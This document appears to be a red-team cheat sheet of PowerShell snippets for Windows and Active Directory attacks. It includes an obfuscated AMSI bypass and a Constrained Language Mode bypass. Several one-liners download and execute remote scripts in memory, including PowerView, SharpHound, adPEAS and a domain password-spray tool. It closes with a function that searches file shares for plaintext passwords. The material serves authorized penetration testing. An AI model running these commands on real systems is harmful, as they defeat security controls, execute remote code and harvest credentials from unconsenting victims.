### Bypasses
------------
##### Powershell CLM Bypass:
~~~
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe  -ExecutionPolicy bypass"
sleep 5
#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
~~~

##### Powershell Obfuscated AMSI Bypass:
~~~
$w='System.Management.Automation.A';$c='si';$m='Utils'
$assembly=[Ref].Assembly.GetType(('{0}m{1}{2}'-f$w,$c,$m))
$field=$assembly.GetField(('am{0}InitFailed'-f$c),'NonPublic,Static')
$field.SetValue($null,$true)
~~~

##### Powershell Modified AMSI .Net Bypass script - In Memory
~~~
IEX (New-Object Net.Webclient).DownloadString('https://gist.githubusercontent.com/shantanu561993/6483e524dc225a188de04465c8512909/raw/db219421ea911b820e9a484754f03a26fbfb9c27/AMSI_bypass_Reflection.ps1')
~~~

### Scripts - In Memory
-----------------------
#### Host Recon
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1');
Invoke-HostRecon
~~~

#### ConvertTo-PowerShell
~~~
IEX (New-Object Net.Webclient).DownloadString('https://github.com/cfalta/PowerShellArmoury/raw/2d9bea5e1c10353186fe75ebc28c5e596247dca3/utilities/ConvertTo-Powershell.ps1');
~~~

##### Powerview
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
~~~

##### Spray
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/HeeresS/DomainPasswordSpray/master/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Domain <domain> -Password password
~~~
##### Sharphound
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -Domain <domain> -CollectionMethod All
~~~
##### Safe SSL/TLS-Channel
~~~
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [
Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.Se
curityProtocolType]::Tls12
~~~
##### BloodHound collector (adPEAS)
~~~
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/6110
6960/adPEAS/main/adPEAS.ps1'); Invoke-adPEAS -Module Bloodhound -Scope All
~~~
##### Check PATH of host and permissions on each folder in PATH (PowerShell function)
~~~
function Invoke-PathCheck {
    param (
        [string]$AccesschkPath = ".\accesschk64.exe"
    )

    # Controleer of accesschk64.exe bestaat
    if (-Not (Test-Path $AccesschkPath)) {
        Write-Host "accesschk64.exe not found at $AccesschkPath"
        return
    }

    # Split de $Env:Path en controleer permissies voor elke map
    $Env:Path -split ";" | ForEach-Object {
        $path = $_.Trim()
        if (-Not [string]::IsNullOrWhiteSpace($path)) {
            Write-Host "[+] Checking permissions for: $path"
            & $AccesschkPath -wud -accepteula $path
            Write-Host "---------------------------"
        }
    }
}

# Roep de functie aan
Invoke-PathCheck -AccesschkPath "C:\Path\to\accesschk64.exe"
~~~
##### Just check PATH
~~~
$Env:Path -split ";" | ForEach-Object { $_ }
~~~
##### Invoke-PasswordSearch
~~~
function Invoke-PasswordSearch {
    param (
        [Parameter(Mandatory=$true)]
        [string]$SharesFilePath
    )

    # Lees alle paden uit het tekstbestand
    $paths = Get-Content -Path $SharesFilePath

    $results = @()

    foreach ($path in $paths) {
        # Controleer of het pad niet leeg is
        if (![string]::IsNullOrWhiteSpace($path)) {
            Write-Host "Processing path: $path"
            try {
                $matches = Get-ChildItem -Path $path -Recurse -File | Select-String "password="
                $results += $matches | ForEach-Object {
                    [PSCustomObject]@{
                        Path       = $_.Path
                        Line       = $_.Line
                        LineNumber = $_.LineNumber
                    }
                }
            } catch {
                Write-Host "Failed to process path: $path"
            }
        }
    }

    # Retourneer de resultaten
    return $results
}

# Voorbeeld van het aanroepen van de functie en het opslaan van de resultaten in een variabele
# $searchResults = Invoke-PasswordSearch -SharesFilePath "C:\path\to\shares.txt"
